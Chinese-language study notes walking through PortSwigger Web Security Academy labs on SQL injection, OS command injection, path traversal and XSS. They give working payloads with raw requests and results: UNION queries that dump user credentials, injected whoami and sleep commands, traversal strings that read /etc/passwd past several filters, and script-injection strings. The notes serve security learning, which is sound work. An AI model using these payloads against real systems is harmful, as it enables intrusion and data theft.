[https://portswigger.net/web-security](https://portswigger.net/web-security)



# SQL injection
[https://portswigger.net/web-security/all-labs#sql-injection](https://portswigger.net/web-security/all-labs#sql-injection)



## [<font style="color:#000000;">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</font>](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
这个实验环境内，是反应网站在更新显示的数据时，从数据库查询数据的过程。

修改对应的查询限制条件，显示所有的商品





## [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
这个实验环境，说明了绕过登录验证。





## SQL injection UNION attack, determining the number of columns returned by the query
在catagory后添加：' ORDER BY 1 --

```python
GET /filter?category=Lifestyle HTTP/2
Host: 0a43006d04ea24e0805d1c39002b006b.web-security-academy.net
Cookie: session=H4d5ogODd9SgqLqG4W6xgyIE81FXxg62
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a43006d04ea24e0805d1c39002b006b.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

探测到第三列出现报错，所以返回列数是3







## SQL injection UNION attack, finding a column containing text


```python
' ORDER BY 3 --
探测结果为3
' UNION SELECT test, null --
' UNION SELECT null, test --
使用UNION语句，上述两条都错误。
' UNION SELECT 'test', NULL, NULL --
' UNION SELECT null,'test',null--
加单引号说明是字符串，不加则是字段名

记得加逗号

'+UNION+SELECT+'abcdef',NULL,NULL--
'UNION SELECT null,null,'test'--
'union select null,'tCmavF',null--

测试三列中，哪一列可以输出字符串。
三条命令测三个位置

PS：大小写不关键，关键的是逗号要写；以及在BP中复制值，要看好位置，不要在要闭合的值处多一个空格

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781518774649-249d6736-648f-48c3-8179-a5d87e03877a.png)

单引号一定是在ies后，而不要多出一个空格，记得注入前进行检查。



---



## SQL injection UNION attack, retrieving data from other tables
' ORDER BY 2 --

先探测，发现返回两列

接下来测试两列中，谁输出字符串



```python
' UNION SELECT 'test',null --
第一列ok
' UNION SELECT null,'test' --
第二列也ok
所以两列都可行。


尝试获取账户密码
' UNION SELECT  FROM --

先拖表名：

  ' UNION SELECT table_name, null FROM information_schema.tables --
获得了很多行表名，不确定要拿哪个


 然后拖列名：

  ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --
在这里发现第3，4列是用户名和密码

  最后拿数据。


' UNION SELECT username,password FROM users --


' UNION SELECT null, username || ':' || password FROM users --
执行时会查找user和password两个字段，只是将两个两个字段的值拼接在一起，当作一列返回而已
字段是字段，列是列。
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781519882398-6249a3ed-f0da-4438-83d2-aca93eddf483.png)

推测users中存放了用户名和密码



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781519921996-1d042081-44fa-4e14-9290-d7014a751321.png)



' UNION SELECT username,password FROM users --

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781520589093-3d1f720b-8a8d-473d-9afc-3cbe866ec0de.png)

可以看到返回了用户名和密码

| administrator | f0cd70xpiq8xgnj1c582 |
| --- | --- |


| wiener | pw8xs1odvhsptw5e0uyv |
| --- | --- |
| carlos | ds87cb5xnq32imw3gc1v |


---

' UNION SELECT null, username || ':' || password FROM users --

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781520653121-0b16fb9a-3118-4a4f-895a-edb6d07efcc4.png)



## SQL injection attack, querying the database type and version on Oracle
因为想要获得其他的数据，我们还是先进行探测

```python
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 1 --
探测结果为返回两列

' UNION SELECT 'test',null --
第一列no
' UNION SELECT null,'test' --
第二列也no

不是你的问题。两列都报错——大概率是Oracle。Oracle要求必须有FROM子句。
Oracle 中任何 SELECT 语句不能缺少 FROM，不能直接写 SELECT 1,null，会直接语法报错。
必须指定数据源表，没有业务表可用时，统一用系统虚表 dual。
' UNION SELECT null, null FROM dual --

' UNION SELECT null,'test' FROM dual --
' UNION SELECT 'test',null FROM dual --
两列都输出字符串

' UNION SELECT banner, null FROM v$version --
结果中有：
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781521655113-bc600e62-e3cc-473d-a467-4a93f03fea69.png)



# OS command injection
## OS command injection, simple case
注入点在商品详情页面的

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781778876333-0e09a366-ce3c-481e-bc84-5fd2cfd122f7.png)

```python
POST /product/stock HTTP/2
Host: 0a6d007104f528e281337f72003c00e6.web-security-academy.net
Cookie: session=opZoWyUPQiwF2joIbkCbsPmztMvZxN8E
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6d007104f528e281337f72003c00e6.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a6d007104f528e281337f72003c00e6.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=1&storeId=2 此处为注入点
productId=1&storeId=1|whoami

 1;whoami
  1&whoami&
  1%0awhoami


响应：
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-YMK3BY

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781778919927-8f4b94c0-4ded-4aab-96f9-c2c1f02d9cfb.png)

<font style="color:#DF2A3F;">productId=1&storeId=1|whoami 这个注入为什么会生效？</font>

## Blind OS command injection with time delays
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781779241636-123ae176-04b1-4d7d-bf7c-d1504adfa43b.png)

<font style="color:#DF2A3F;">四个参数，哪一个才是注入点？实战中怎么判断？</font>

<details class="lake-collapse"><summary id="u6da16852"><span class="ne-text">判断的方法：</span></summary><p id="ufc862478" class="ne-p"><span class="ne-text">盲注入的探测流程</span></p><p id="ub4503911" class="ne-p"><span class="ne-text" style="color: #DF2A3F">  </span><span class="ne-text">你把每个输入点都当成嫌疑人，逐个审问。方法是给每个参数轮流塞 sleep 5，看哪个让服务器卡了。</span></p><p id="u75ecdd5a" class="ne-p"><span class="ne-text">  反馈表单有5个参数：name、email、subject、message、csrf。</span></p><p id="u75b6e2e4" class="ne-p"><span class="ne-text">  第一轮排查——每个参数单独试：</span></p><p id="ub386c99f" class="ne-p"><span class="ne-text">  试 name:     name=;sleep+5;&amp;email=</span><span class="ne-text">test@1.com</span><span class="ne-text">&amp;subject=hi&amp;message=hi<br /></span><span class="ne-text">  试 email:    name=hi&amp;email=test;sleep+5;&amp;subject=hi&amp;message=hi<br /></span><span class="ne-text">  试 subject:  name=hi&amp;email=</span><span class="ne-text">test@1.com</span><span class="ne-text">&amp;subject=;sleep+5;&amp;message=hi<br /></span><span class="ne-text">  试 message:  name=hi&amp;email=</span><span class="ne-text">test@1.com</span><span class="ne-text">&amp;subject=hi&amp;message=;sleep+5;</span></p><p id="u17d8a02d" class="ne-p"><span class="ne-text">  每个发一次，记录响应时间。哪个参数让响应从几十毫秒变成5000多毫秒，哪个就是注入点。</span></p><p id="u837d6adb" class="ne-p"><span class="ne-text">  第二轮——如果第一轮都没命中：</span></p><ul class="ne-ul"><li id="u6d03c4c3" data-lake-index-type="0"><span class="ne-text">请求头也要试：User-Agent、Referer、X-Forwarded-For（服务器可能把这些字段拼进命令，比如写日志时 grep &quot;$user_agent&quot;）</span></li><li id="uc48205b1" data-lake-index-type="0"><span class="ne-text">参数值的不同位置：;sleep+5; 和 ||sleep+5|| 和 </span><code class="ne-code"><span class="ne-text">sleep 5</span></code></li></ul><p id="u5d47bfc2" class="ne-p"><span class="ne-text">  核心原则：你不需要知道服务器在后台干什么。你只要系统性地逐个参数注入 sleep，看响应时间——时间就是证据。</span></p><hr id="L0d4P" class="ne-hr"><p id="u4608b9e5" class="ne-p"><span class="ne-text">  放到语义树里：这和SQL注入的 '<br /></span><span class="ne-text">  探测是同一个逻辑——输入一个特殊字符，观察系统行为变化。SQL里看语法报错，命令注入里看响应时间。工具不同，逻辑相同。</span></p></details>
<font style="color:#DF2A3F;">所以：没什么好的办法就一个一个试，优先级就是先尝试你觉得嫌疑大的。</font>

<font style="color:#DF2A3F;"></font>

```python
email=x;sleep+10;@example.com
email=x||ping+-c+10+127.0.0.1|| 利用命令注入漏洞，让服务器持续 ping 自身 10 次，可用于判断漏洞是否存在（延时响应即证明注入成功）

POST /feedback/submit HTTP/2
Host: 0a44000a035057b180f0999e00630069.web-security-academy.net
Cookie: session=38kR6r5rfTpupUnvuZhVQdZUwOWXfS6o
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: https://0a44000a035057b180f0999e00630069.web-security-academy.net
Referer: https://0a44000a035057b180f0999e00630069.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=J1OaKX8k5DmAQ6hCp5iGFYf0oPBj8Nwh&name=21&email=323%401.com&subject=221&message=sadasda
改成：
csrf=J1OaKX8k5DmAQ6hCp5iGFYf0oPBj8Nwh&name=21&email=x;sleep+10;&subject=221&message=sadasda
如果响应延迟 10 秒左右加载完成，说明命令注入生效，属于时间盲注，适合无回显的命令注入靶场。
```



## Blind OS command injection with output redirection


这个要用输出重定向——把命令结果写到一个你能访问的文件里。

```python
  思路：
  email=x;whoami>/var/www/images/output.txt;&subject=...
 然后浏览器访问 /image?filename=output.txt 读结果。
  反馈表单照常截 POST，改 email 参数。先试上面的 payload，发了告诉我响应时间正常（不需要
  sleep），然后去访问对应的图片路径。

email=x;whoami>/var/www/images/output.txt;

然后访问 /image?filename=output.txt。

csrf=qnT0Cbsbkrc0Al1lc5Y5CsvWUvkDVWiR&name=2121313&email=sdasds%40163.com&subject=313113&message=1ddasad
csrf=qnT0Cbsbkrc0Al1lc5Y5CsvWUvkDVWiR&name=2121313&email=x;whoami>/var/www/images/output.txt;&subject=313113&message=1ddasad

结果：Failed to submit feedback: "Could not save"
whoami 那段执行了，但重定向时把 feedback 保存搞崩了。

  换写法。把命令结果写到图片目录，而且不能破坏原来的保存流程：

  email=xyz||whoami>/var/www/images/output.txt||

  用 || 的好处：邮件地址不合法，第一个命令（发邮件那步）失败之后才执行 whoami。试这个。

csrf=qnT0Cbsbkrc0Al1lc5Y5CsvWUvkDVWiR&name=2121313&email=sdasds%40163.com&subject=313113&message=1ddasad
csrf=qnT0Cbsbkrc0Al1lc5Y5CsvWUvkDVWiR&name=2121313&email=xyz||whoami>/var/www/images/output.txt||&subject=313113&message=1ddasad
该命令成功
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781781713200-50d29b4e-01c5-4e90-be04-fd9123fcfabd.png)

<details class="lake-collapse"><summary id="u481ebe38"><span class="ne-text">email=x;whoami&gt;/var/www/images/output.txt;</span></summary><ul class="ne-ul"><li id="ue5e73497" data-lake-index-type="0" style="text-align: left; line-height: 3"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">先执行无效命令 </span><code class="ne-code"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">x</span></code><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">（无作用，仅用来截断原有后台拼接的命令）</span></li><li id="u144c9a28" data-lake-index-type="0" style="text-align: left; line-height: 3"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">执行 </span><code class="ne-code"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">whoami</span></code><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px"> 获取当前系统用户名</span></li><li id="u0ded3fa9" data-lake-index-type="0" style="text-align: left; line-height: 3"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">将用户名结果保存到 </span><code class="ne-code"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">/var/www/images/output.txt</span></code><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">，不直接在页面返回（解决无回显命令注入）</span></li><li id="u578a5e97" data-lake-index-type="0" style="text-align: left; line-height: 3"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">末尾 </span><code class="ne-code"><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px">;</span></code><span class="ne-text" style="color: rgb(0, 0, 0); background-color: rgba(0, 0, 0, 0); font-size: 16px"> 补齐 shell 语法，防止后端拼接后出现命令语法错误</span></li></ul></details>




<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781781784233-70e53a84-f46b-4825-aecf-2c56c5d9b5e8.png)





---











## Path traversal




# Path traversal
## File path traversal, simple case
右键图片

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781785122163-20182afb-fb3a-4314-a3a0-72d2b046c104.png)

抓到请求：

```python
GET /image?filename=21.jpg HTTP/2
Host: 0aac006a038a5056826b153800d9000f.web-security-academy.net
Cookie: session=g6eGCDMIHH8TuZyZ60HjWdcEkjNyfGEB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aac006a038a5056826b153800d9000f.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i
Te: trailers

filename=21.jpg 说明图片从 /var/www/images/ 读的。
你要退三层回去读 /etc/passwd：
在 Repeater 里把 filename 参数改成这个，发了看结果。
filename=../../../etc/passwd
原本是要从这个路径下读文件21.jpg。（没写路径就是默认路径），将路径改成我们想要读取的，../用来回退，几个../就往上退几层

路径退到根：../../../ 让文件系统从 /var/www/images/21.jpg 一路往上退到 /，然后进入 /etc/passwd。
原理：
起点:  /var/www/images/
../../../ → 退到 /var
../../../ → 退到 /
/etc/passwd →进入目标文件

     /var/www/images/../../../etc/passwd
  = /var/www/../../etc/passwd      （退images）
 = /var/../etc/passwd              （退www）
  = //etc/passwd                    （退var）
  = /etc/passwd
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781785366336-8dd60fc0-2e2a-4495-a98b-da4be59f1070.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781785728038-0a05eedf-1145-46b5-aed9-1f65397579c7.png)

在浏览器中没什么信息显示。

正常。浏览器收到 /etc/passwd 的文本内容，但 Content-Type 可能还是 image/jpeg——浏览器当图片渲染，显示不出来。Repeater里看原始响应才是对的



所以做这个，要对文件的层级有了解。知道哪一层有什么，方便获取信息。



## File path traversal, traversal sequences blocked with absolute path bypass


../ 被过滤拦截，但可以通过绝对路径到达

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781785905770-5987e5d7-f54e-41c0-bd39-136444721c76.png)

直接用这个：

filename=/etc/passwd

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786122273-4ed9586b-11c1-4f33-a2f1-f08a079f94dc.png)







## File path traversal, traversal sequences stripped non-recursively
 文件路径遍历漏洞：遍历序列（`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">../</font>`）采用**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">非递归替换</font>**方式清除  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786210660-ed83324e-f013-4596-8645-a833260cee97.png)

把字符串拆开看：

原始: ....//....//....//etc/passwd

服务器删../后:  ../../etc/passwd

服务器删了一次 ../，结果剩下的字符正好又拼出一个 ../。但你不用嵌套，一次注入就够了。

 三个 ....// 变成了三个 ../。发出去。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786468041-e67fcc8b-7423-40bf-b171-ad5721fef2bb.png)





## File path traversal, traversal sequences stripped with superfluous URL-decode
 文件路径遍历漏洞：防护代码会剔除路径跳转符，但存在**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">多余二次 URL 解码</font>**漏洞  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786661572-8fbe7ede-9929-4dd9-9ae9-bd57fb91589f.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786738947-1dc6f800-3d68-444f-90cc-0c24ca325765.png)

所以这第二次解码，是程序员写代码时留下的。



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786814538-4ecbc6ed-02f5-47ce-a423-c0a9b1551423.png)

这条路堵死了，就换一条路



filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

<details class="lake-collapse"><summary id="u3e3590c3"><span class="ne-text">解码说明</span></summary><p id="u965d9c33" class="ne-p"><span class="ne-text">一次解码后：%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span></p><p id="u6e5cfc1c" class="ne-p"><span class="ne-text">再解码：../../../etc/passwd</span></p><p id="u0b07e772" class="ne-p"><img src="https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786967922-3347a1a4-73f8-4fdc-b273-b4b81c49507d.png" width="388" title="" crop="0,0,1,1" id="ue2f2b3bb" class="ne-image"></p></details>
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781786922816-569e2471-ddb2-43ca-8501-331cb75bc153.png)





## File path traversal, validation of start of path
 文件路径遍历漏洞：仅校验路径**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">开头</font>**，防护存在缺陷可绕过  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781787173784-478c6a5b-a870-408a-960d-4cd834aa7cc8.png)

也就是说，只看开头匹配不匹配。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781787256527-a44876ae-64ab-499d-8e98-6f33bf1edcbe.png)

filename=/var/www/images/../../../etc/passwd

验证代码只检查了开头是不是 /var/www/images/，检查过了之后，后面的 ../../../etc/passwd 照样把文件系统往回退。发出去。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781787316573-d6fd252c-f17b-49a5-aa1c-c6b22451c9e6.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781787442546-e55b1173-b3ce-4099-890d-fa77add7ca2c.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781787496639-b67fd49e-e03d-414e-9f98-d7de396fb6c0.png)





## File path traversal, validation of file extension with null byte bypass
 文件路径遍历漏洞：后端校验文件后缀名，但可通过**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">空字节 %00</font>** 绕过校验  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781788195711-f04e83ce-01f2-4f45-a350-78dac2467384.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781788352589-e3e0118e-435a-4b15-91cd-fa6e838ceb8c.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781788235247-964f5be1-c2b5-4281-8750-cb5f4f33824c.png)

所以满足php验证即可。

filename=../../../etc/passwd%00.jpg

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781788323789-066bb9a1-6a2c-43a5-8951-f1d15a2cf7e8.png)











# XSS
## Reflected XSS into HTML context with nothing encoded
**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">nothing encoded（无任何转义 / 编码）</font>**：后端输出数据时，**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">没有对 </font>**`**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">< > " ' &</font>**`**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 等 HTML 特殊字符做实体转义</font>**，浏览器会直接将输入解析为 HTML/JS 代码。  

<script>alert(1)</script>

在搜索框中直接搜索<script>alert(1)</script>，发现弹窗

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781862662904-9ca88053-ed5f-48a8-ab87-43303c88595a.png)



## Stored XSS into HTML context with nothing encoded
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781863025737-affa487f-3c6d-493a-af59-4da4db089076.png)



储存型，将<script>alert(1)</script>写入评论提交。

这样每个人访问网页时，都看到我们的评论，会弹窗。

website格式：<font style="color:rgb(0, 0, 0);">https://target.test</font>



## Reflected XSS into attribute with angle brackets HTML-encoded


本实验在博客搜索功能处存在**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">反射型跨站脚本（XSS）漏洞</font>**，页面会对尖括号做 HTML 实体编码处理。要完成本实验，你需要实施一次 XSS 攻击：注入新 HTML 属性并调用 alert 弹窗函数。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781863276517-c20a4c1c-eaf4-4615-b772-ab9c4b9558d4.png)





直接在搜索框搜索<script>alert(1)</script>，没有弹窗



在评论区提交，发现<script>alert(1)</script>可以看到了。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781863438056-937f2afc-ac8f-43af-83b7-3af04adb9a67.png)



这说明了什么？

没有思路：

<details class="lake-collapse"><summary id="ubb0f7d92"></summary><p id="uf54147fa" class="ne-p"><span class="ne-text">操作步骤：</span></p><p id="u58eab903" class="ne-p"><span class="ne-text">  第一步：确认注入点在哪</span></p><p id="u165589e2" class="ne-p"><span class="ne-text"> 搜索一个字符串，比如 test。右键查看页面源码，Ctrl+F搜 test。看它出现在HTML的什么位置。</span></p><p id="u8b652213" class="ne-p"><span class="ne-text">  你应该看到类似：<br /></span><span class="ne-text">  </span></p><p id="u401f292e" class="ne-p"><span class="ne-text">  你的输入在 value=&quot;...&quot; 属性里。这就是上下文2——属性值内。</span></p><p id="u07c3ad24" class="ne-p"><span class="ne-text">  第二步：试引号</span></p><p id="ufa388c9b" class="ne-p"><span class="ne-text">  搜索：test&quot;<br /></span><span class="ne-text">  看源码。如果引号没有被转义——你看到了value=&quot;test&quot;&quot;（两个引号），引号就是可用的。</span></p><p id="uf31c7ec9" class="ne-p"><span class="ne-text">  第三步：闭合属性，加事件</span></p><p id="u5d2ce289" class="ne-p"><span class="ne-text">  既然尖括号被转义，你不能插 </span></p><p id="udfaf8b5f" class="ne-p"><span class="ne-text">  搜索：<br /></span><span class="ne-text">  &quot; autofocus onfocus=&quot;alert(1)</span></p><p id="u23123a37" class="ne-p"><span class="ne-text">  为什么生效：</span></p><ul class="ne-ul"><li id="u056aaf2f" data-lake-index-type="0"><span class="ne-text">&quot; —闭合了value属性</span></li><li id="u4aeb8b6b" data-lake-index-type="0"><span class="ne-text">autofocus —让这个input自动获得焦点</span></li><li id="ubd31dc7a" data-lake-index-type="0"><span class="ne-text">onfocus=&quot;alert(1)&quot; —获得焦点时执行alert</span></li><li id="u5e78e23a" data-lake-index-type="0"><span class="ne-text">原代码最后一个 &quot; 自动闭合onfocus</span></li></ul><p id="u50c9a03a" class="ne-p"><span class="ne-text">  如果autofocus被过滤，换事件：<br /></span><span class="ne-text">  &quot; onclick=&quot;alert(1)<br /></span><span class="ne-text">  然后点一下搜索框。</span></p><p id="u0e2b9d40" class="ne-p"><span class="ne-text">  &quot; onmouseover=&quot;alert(1)<br /></span><span class="ne-text">  鼠标移上去就触发。</span></p></details>


随便搜索一串字母，查看网页源代码。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781863733143-b11db87d-f692-46ed-842b-93a2038f4d9f.png)

搜索test

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781864390705-ea431347-a021-4141-9e86-7057e960e653.png)

搜索test"

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781863963823-efa35b99-dabf-429e-8610-654fd4950458.png)

说明"可用，且这是在属性值内。先闭合引号，再插入标签。

" onfocus="alert(1)

"><script>alert(1)</script>



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781864647228-8d2c852a-04e5-42fe-b821-3811c39fb588.png)



input value 在属性值内。上下文的第二类。



使用BP

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1781865148876-33433679-107f-4045-957b-b41a6323da05.png)



## <font style="color:#DF2A3F;">Reflected XSS into HTML context with most tags and attributes blocked</font>
[https://blog.csdn.net/m0_65361643/article/details/151783965](https://blog.csdn.net/m0_65361643/article/details/151783965)

[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

<details class="lake-collapse"><summary id="u5365ed6e"><span class="ne-text">标签</span></summary><p id="u47f1171c" class="ne-p"><span class="ne-text">a</span></p><p id="uf87f758a" class="ne-p"><span class="ne-text">abbr</span></p><p id="u8217f1fd" class="ne-p"><span class="ne-text">acronym</span></p><p id="uf4332741" class="ne-p"><span class="ne-text">address</span></p><p id="u78f50c11" class="ne-p"><span class="ne-text">animate</span></p><p id="ue3b90178" class="ne-p"><span class="ne-text">animatemotion</span></p><p id="u718c18ff" class="ne-p"><span class="ne-text">animatetransform</span></p><p id="u2a055027" class="ne-p"><span class="ne-text">applet</span></p><p id="u57f5441b" class="ne-p"><span class="ne-text">area</span></p><p id="u64386d8e" class="ne-p"><span class="ne-text">article</span></p><p id="ucbb075c3" class="ne-p"><span class="ne-text">aside</span></p><p id="u6cba80fa" class="ne-p"><span class="ne-text">audio</span></p><p id="uaad83a51" class="ne-p"><span class="ne-text">b</span></p><p id="u314f79df" class="ne-p"><span class="ne-text">base</span></p><p id="u0eb4ba09" class="ne-p"><span class="ne-text">bdi</span></p><p id="u524e7ec6" class="ne-p"><span class="ne-text">bdo</span></p><p id="ua4c69c30" class="ne-p"><span class="ne-text">big</span></p><p id="ub89741e7" class="ne-p"><span class="ne-text">blink</span></p><p id="ucb7dabcb" class="ne-p"><span class="ne-text">blockquote</span></p><p id="u83519fd9" class="ne-p"><span class="ne-text">body</span></p><p id="ufe25c26e" class="ne-p"><span class="ne-text">br</span></p><p id="u50ec0b38" class="ne-p"><span class="ne-text">button</span></p><p id="u4c5205c8" class="ne-p"><span class="ne-text">canvas</span></p><p id="u1c8d9970" class="ne-p"><span class="ne-text">caption</span></p><p id="ucb2083d3" class="ne-p"><span class="ne-text">center</span></p><p id="u3c947c0f" class="ne-p"><span class="ne-text">cite</span></p><p id="u920df1d6" class="ne-p"><span class="ne-text">code</span></p><p id="ue859faa4" class="ne-p"><span class="ne-text">col</span></p><p id="u9b6f11cb" class="ne-p"><span class="ne-text">colgroup</span></p><p 